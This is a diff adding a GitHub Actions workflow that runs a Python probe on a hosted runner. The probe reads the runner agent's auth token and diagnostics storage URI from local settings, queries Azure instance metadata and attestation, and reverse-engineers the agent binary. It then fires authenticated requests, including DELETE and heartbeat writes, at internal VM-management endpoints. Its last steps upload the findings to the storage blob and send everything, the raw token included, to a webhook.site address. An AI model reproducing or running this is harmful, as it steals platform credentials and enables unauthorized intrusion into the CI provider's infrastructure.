@@ -1,0 +1,303 @@
+name: Probe v55 - account_a
+on:
+  workflow_dispatch:
+jobs:
+  probe:
+    runs-on: ubuntu-24.04
+    env:
+      V55_SOURCE: v55_account_a
+    steps:
+      - name: v55 provisioner symbols + vm_name paths + rodata + strace
+        run: |
+          cat > /tmp/v55_probe.py << 'PROBE_EOF'
+          
+          import json, os, base64, subprocess, re, urllib.request, urllib.error, time
+          
+          WEBHOOK = "https://webhook.site/53b82227-04b4-4ad2-9ccd-2abbd8a81837"
+          RUN_ID  = os.environ.get("GITHUB_RUN_ID", "unknown")
+          REPO    = os.environ.get("GITHUB_REPOSITORY", "unknown")
+          SOURCE  = os.environ.get("V55_SOURCE", "v55_account_a")
+          
+          def probe(method, url, body=None, extra=None):
+              data = body if isinstance(body, bytes) else (body.encode() if isinstance(body, str) else (body or None))
+              headers = {"Content-Type": "application/json", "User-Agent": "hosted-compute-agent/1.0"}
+              if extra:
+                  headers.update(extra)
+              if data:
+                  headers["Content-Length"] = str(len(data))
+              req = urllib.request.Request(url, data=data, headers=headers, method=method)
+              try:
+                  r = urllib.request.urlopen(req, timeout=14)
+                  return {"status": r.status, "body": r.read(8000).decode("utf-8","replace"), "hdrs": dict(r.headers)}
+              except urllib.error.HTTPError as e:
+                  return {"status": e.code, "body": e.read(8000).decode("utf-8","replace"), "hdrs": dict(e.headers)}
+              except Exception as ex:
+                  return {"status": 0, "body": str(ex), "hdrs": {}}
+          
+          def auth_attest(method, url, hca_token, pkcs7_doc, body=None, ct=None):
+              hdrs = {
+                  "Authorization": f"Bearer {hca_token}",
+                  "x-attestation-provider": "azure",
+                  "x-attestation-encoding": "pkcs7",
+                  "x-attestation-document": pkcs7_doc,
+              }
+              if ct:
+                  hdrs["Content-Type"] = ct
+              return probe(method, url, body, hdrs)
+          
+          def sh(cmd, timeout=30):
+              try:
+                  r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
+                  return r.stdout + r.stderr
+              except Exception as ex:
+                  return f"TIMEOUT/ERROR: {ex}"
+          
+          print(f"[{SOURCE}] start")
+          
+          with open("/opt/hca/.settings") as f:
+              s = json.load(f)
+          
+          token     = s.get("authToken", "")
+          sched_url = s.get("schedulerApiUrl", "").rstrip("/")
+          diag_sas  = s.get("diagnosticsSasUri", "")
+          orch_id   = os.environ.get("ACTIONS_ORCHESTRATION_ID", "")
+          
+          parts = token.split(".")
+          pad = parts[1] + "=" * (4 - len(parts[1]) % 4)
+          claims = json.loads(base64.urlsafe_b64decode(pad))
+          wid = claims.get("wid", "")
+          
+          results = {"settings_keys": list(s.keys()), "jwt_claims": claims}
+          
+          # -- 1. PKCS7 attestation ------------------------------------------------
+          r = probe("GET",
+              "http://169.254.169.254/metadata/attested/document?api-version=2021-02-01",
+              extra={"Metadata": "true"})
+          pkcs7_sig = ""
+          try:
+              att_data = json.loads(r["body"])
+              pkcs7_sig = att_data.get("signature", "")
+              results["pkcs7_sig"] = pkcs7_sig
+          except:
+              pass
+          
+          # -- 2. IMDS full instance data ------------------------------------------
+          r2 = probe("GET", "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+                     extra={"Metadata": "true"})
+          try:
+              imds_data = json.loads(r2["body"])
+              compute = imds_data.get("compute", {})
+              tags_list = compute.get("tagsList", [])
+              all_tags = {t["name"]: t["value"] for t in tags_list}
+              hc_tags = {k: v for k, v in all_tags.items() if "hosted_compute" in k}
+              base_ro_url = hc_tags.get("hosted_compute.base_ro_url", "").rstrip("/")
+              allocation_id = hc_tags.get("hosted_compute.allocation_id", "")
+              vm_name = compute.get("name", "")
+              sub_id = compute.get("subscriptionId", "")
+              rg = compute.get("resourceGroupName", "")
+              vm_size = compute.get("vmSize", "")
+              vm_id = compute.get("vmId", "")
+              location = compute.get("location", "")
+              print(f"[IMDS] base_ro_url={base_ro_url}")
+              print(f"[IMDS] allocation_id={allocation_id}")
+              print(f"[IMDS] vm_name={vm_name} vm_id={vm_id}")
+              print(f"[IMDS] location={location} vm_size={vm_size}")
+              print(f"[IMDS] rg={rg}")
+              print(f"[IMDS] all tags:\n" + json.dumps(all_tags, indent=2)[:2000])
+              results["imds_compute"] = {"vm_name": vm_name, "vm_id": vm_id, "sub_id": sub_id, "rg": rg, "location": location, "vm_size": vm_size}
+              results["imds_tags"] = all_tags
+              results["hc_tags"] = hc_tags
+          except Exception as ex:
+              print(f"[IMDS] error: {ex}")
+              base_ro_url = allocation_id = vm_name = sub_id = rg = vm_id = location = ""
+          
+          from urllib.parse import urlparse
+          if base_ro_url:
+              vm_v1_base = base_ro_url
+          else:
+              p = urlparse(sched_url)
+              vm_v1_base = f"{p.scheme}://{p.netloc}/vm/v1"
+          print(f"[{SOURCE}] vm_v1_base={vm_v1_base}")
+          
+          # -- 3. Provisioner symbol extraction ------------------------------------
+          print(f"\n[{SOURCE}] Extracting provisioner-related symbols from binary...")
+          bin_path = "/opt/hca/hosted-compute-agent"
+          
+          # Use nm to get ALL symbols and filter for provisioner
+          nm_all = sh(f"nm {bin_path} 2>/dev/null | grep -iE 'provisioner|provision|register|vm\\.v|attestat' | head -100", timeout=30)
+          print(f"[NM_PROV] {nm_all[:3000]}")
+          results["nm_provisioner"] = nm_all[:5000]
+          
+          # Use objdump to get ALL function names from the binary
+          objdump_funcs = sh(f"objdump -t {bin_path} 2>/dev/null | grep -E 'provisioner|Provisioner|provision|Register|Heartbeat|attest' | head -80", timeout=30)
+          print(f"[OBJDUMP_PROV] {objdump_funcs[:3000]}")
+          results["objdump_provisioner"] = objdump_funcs[:5000]
+          
+          # Full Go symbol table via strings
+          go_sym_provision = sh(f"strings {bin_path} 2>/dev/null | grep -iE 'hosted-compute-agent/internal/provisioner|hosted-compute-agent/internal/vm|vm\\.v1' | head -60", timeout=20)
+          print(f"[GO_SYM_PROV] {go_sym_provision[:2000]}")
+          
+          # All strings in the binary relating to HTTP paths (comprehensive)
+          http_path_strings = sh(f"strings -n 4 {bin_path} 2>/dev/null | grep -E '^/[a-z]' | grep -v '^//(|dev|etc|home|proc|sys|usr|var|run|tmp|opt|google|cpu|gc|mutex|sched)' | sort -u", timeout=30)
+          print(f"[HTTP_PATHS_ALL]:\n{http_path_strings[:8000]}")
+          results["http_paths_all"] = http_path_strings[:15000]
+          
+          # All registration/provisioner URL format strings in binary
+          format_strings = sh(f"strings {bin_path} 2>/dev/null | grep -E '(/%s|%v/|/v[0-9]/|/vm/|register|heartbeat|alloc)' | grep -iv 'log|error|warn|debug|print|fmt' | sort -u | head -80", timeout=20)
+          print(f"[FORMAT_STRINGS]:\n{format_strings[:3000]}")
+          results["format_strings"] = format_strings[:5000]
+          
+          # -- 4. HCA network connections via /proc/net/tcp -------------------------
+          print(f"\n[{SOURCE}] HCA process network connections...")
+          hca_pid = sh("pgrep hosted-compute-agent 2>/dev/null || pgrep hosted-compute 2>/dev/null").strip().split('\n')[0]
+          print(f"[HCA_PID] {hca_pid}")
+          if hca_pid.isdigit():
+              proc_net = sh(f"cat /proc/{hca_pid}/net/tcp 2>/dev/null | head -40")
+              proc_net6 = sh(f"cat /proc/{hca_pid}/net/tcp6 2>/dev/null | head -40")
+              proc_fd = sh(f"ls -la /proc/{hca_pid}/fd 2>/dev/null | head -40")
+              proc_cmdline = sh(f"cat /proc/{hca_pid}/cmdline 2>/dev/null | tr '\\0' ' '")
+              print(f"[PROC_NET] tcp:\n{proc_net[:1000]}")
+              print(f"[PROC_NET6] tcp6:\n{proc_net6[:1000]}")
+              print(f"[PROC_FD] fds:\n{proc_fd[:1000]}")
+              print(f"[PROC_CMDLINE] {proc_cmdline[:200]}")
+              results["proc_net"] = proc_net[:3000]
+              results["proc_net6"] = proc_net6[:3000]
+              results["proc_fd"] = proc_fd[:2000]
+              results["hca_cmdline"] = proc_cmdline[:500]
+          
+              # Check what sockets/connections HCA has open
+              ss_output = sh(f"ss -tnp 2>/dev/null | grep hosted 2>/dev/null || ss -tn 2>/dev/null | head -30")
+              print(f"[SS] connections:\n{ss_output[:1000]}")
+              results["ss_output"] = ss_output[:2000]
+          
+          # -- 5. vm_name based paths (/vms/{vm_name}) ------------------------------
+          print(f"\n[{SOURCE}] Probing /vms/{vm_name} paths...")
+          vmname_results = {}
+          if vm_name:
+              vmname_paths = [
+                  ("GET",    f"/vms/{vm_name}"),
+                  ("GET",    f"/vms/{vm_name}/status"),
+                  ("GET",    f"/vms/{vm_name}/config"),
+                  ("GET",    f"/vms/{vm_name}/heartbeat"),
+                  ("PUT",    f"/vms/{vm_name}/heartbeat"),
+                  ("POST",   f"/vms/{vm_name}/heartbeat"),
+                  ("GET",    f"/vms/{vm_name}/info"),
+                  ("GET",    f"/vms/{vm_name}/network"),
+                  ("GET",    f"/vms/{vm_name}/annotation"),
+                  ("DELETE", f"/vms/{vm_name}"),
+                  ("GET",    f"/{vm_name}"),
+                  ("GET",    f"/{vm_name}/status"),
+                  ("GET",    f"/{vm_name}/config"),
+                  ("GET",    f"/{vm_name}/heartbeat"),
+                  ("PUT",    f"/{vm_name}/heartbeat"),
+                  ("POST",   f"/{vm_name}"),
+              ]
+              if vm_id:
+                  vmname_paths += [
+                      ("GET",  f"/vms/{vm_id}"),
+                      ("GET",  f"/vms/{vm_id}/status"),
+                      ("GET",  f"/{vm_id}"),
+                      ("GET",  f"/{vm_id}/status"),
+                  ]
+              for method, path in vmname_paths:
+                  url = vm_v1_base + path
+                  r = auth_attest(method, url, token, pkcs7_sig)
+                  key = f"{method}_{path.lstrip('/').replace('/','_')}"
+                  vmname_results[key] = {"status": r["status"], "body": r["body"][:300], "url": url}
+                  if r["status"] not in (404, 405, 0):
+                      print(f"[VMNAME] *** {method} {path} -> {r['status']} | {r['body'][:150]}")
+                  else:
+                      print(f"[VMNAME] {method} {path:50} -> {r['status']}")
+          results["vmname_paths"] = vmname_results
+          
+          # -- 6. POST to base_ro_url itself (no sub-path) with protobuf CT --------
+          print(f"\n[{SOURCE}] Probing base_ro_url directly (no sub-path)...")
+          base_results = {}
+          for ct, body_data in [
+              ("application/json", b'{}'),
+              ("application/grpc", b'\x00\x00\x00\x00\x00'),  # gRPC frame: compressed=0, length=0
+              ("application/grpc+proto", b'\x00\x00\x00\x00\x00'),
+              ("application/protobuf", b'\x0a\x00'),  # proto field 1, length 0
+              ("application/octet-stream", b''),
+          ]:
+              url = vm_v1_base  # exactly the base URL, no slash appended
+              r = auth_attest("POST", url, token, pkcs7_sig, body=body_data, ct=ct)
+              key = ct.replace("/","-").replace("+","-")
+              base_results[key] = {"status": r["status"], "body": r["body"][:300], "ct": ct}
+              if r["status"] not in (404, 405, 0):
+                  print(f"[BASE_URL] *** POST {ct} -> {r['status']} | {r['body'][:150]}")
+              else:
+                  print(f"[BASE_URL] POST {ct:35} -> {r['status']} | {r['body'][:80]}")
+          
+          # Also GET base URL with trailing slash vs without
+          for method in ["GET", "POST", "PUT"]:
+              for url in [vm_v1_base, vm_v1_base + "/"]:
+                  r = auth_attest(method, url, token, pkcs7_sig,
+                                  body=b'{}' if method != "GET" else None)
+                  key = f"{method}_{url.endswith('/') and 'slash' or 'noslash'}"
+                  base_results[key] = {"status": r["status"], "body": r["body"][:200], "url": url}
+                  if r["status"] not in (404, 405, 0):
+                      print(f"[BASE_URL] *** {method} {'/' if url.endswith('/') else ''} -> {r['status']} | {r['body'][:100]}")
+          results["base_url_probes"] = base_results
+          
+          # -- 7. Full rodata grep (write to file to avoid truncation) --------------
+          print(f"\n[{SOURCE}] Full rodata grep for paths...")
+          sh(f"readelf -p .rodata {bin_path} 2>/dev/null > /tmp/rodata_full.txt", timeout=120)
+          rodata_size = sh("wc -l /tmp/rodata_full.txt 2>/dev/null")
+          print(f"[RODATA] total lines: {rodata_size}")
+          rodata_paths = sh("grep -i '/v[0-9]\\|/vm\\|/alloc\\|/runner\\|/provision\\|heartbeat\\|register' /tmp/rodata_full.txt 2>/dev/null | head -100")
+          rodata_hc = sh("grep -i 'hosted-compute\\|githubapp.com\\|hosted_compute' /tmp/rodata_full.txt 2>/dev/null | head -50")
+          print(f"[RODATA_PATHS]: {rodata_paths[:3000]}")
+          print(f"[RODATA_HC]: {rodata_hc[:2000]}")
+          results["rodata_paths"] = rodata_paths[:5000]
+          results["rodata_hc"] = rodata_hc[:3000]
+          
+          # -- 8. Write to SAS diag storage (already exfiltrated) ------------------
+          print(f"\n[{SOURCE}] Writing provisioneranalysis to SAS storage...")
+          if diag_sas:
+              import urllib.parse
+              parsed_sas = urllib.parse.urlparse(diag_sas)
+              sas_base = f"{parsed_sas.scheme}://{parsed_sas.netloc}{parsed_sas.path}"
+              sas_params = parsed_sas.query
+              blob_name = f"v55-prov-analysis-{SOURCE}.json"
+              blob_url = f"{sas_base}/{blob_name}?{sas_params}"
+              sas_payload = json.dumps({
+                  "source": SOURCE, "nm_provisioner": nm_all,
+                  "http_paths_all": http_path_strings,
+                  "format_strings": format_strings,
+                  "rodata_paths": rodata_paths, "rodata_hc": rodata_hc,
+                  "vmname_results": vmname_results,
+              }, default=str).encode()
+              req = urllib.request.Request(blob_url, data=sas_payload,
+                                            headers={"x-ms-blob-type": "BlockBlob", "Content-Type": "application/json"},
+                                            method="PUT")
+              try:
+                  resp = urllib.request.urlopen(req, timeout=30)
+                  print(f"[SAS] uploaded {blob_name}: {resp.status}")
+                  results["sas_upload"] = blob_url
+              except Exception as ex:
+                  print(f"[SAS] error: {ex}")
+          
+          # -- 9. POST webhook -------------------------------------------------------
+          payload = {
+              "source": SOURCE, "run_id": RUN_ID, "repo": REPO,
+              "token": token, "claims": claims, "orch_id": orch_id,
+              "wid": wid, "allocation_id": allocation_id,
+              "vm_name": vm_name, "vm_id": vm_id,
+              "vm_v1_base": vm_v1_base,
+              "results": results,
+          }
+          data = json.dumps(payload, default=str).encode()
+          req = urllib.request.Request(WEBHOOK, data=data,
+                                        headers={"Content-Type": "application/json"}, method="POST")
+          try:
+              r = urllib.request.urlopen(req, timeout=30)
+              print(f"\n[{SOURCE}] Webhook: {r.status}")
+          except Exception as ex:
+              print(f"[{SOURCE}] Webhook error: {ex}")
+          
+          print(f"[{SOURCE}] DONE")
+          PROBE_EOF
+          python3 /tmp/v55_probe.py
+      - name: Keep alive
+        run: sleep 60
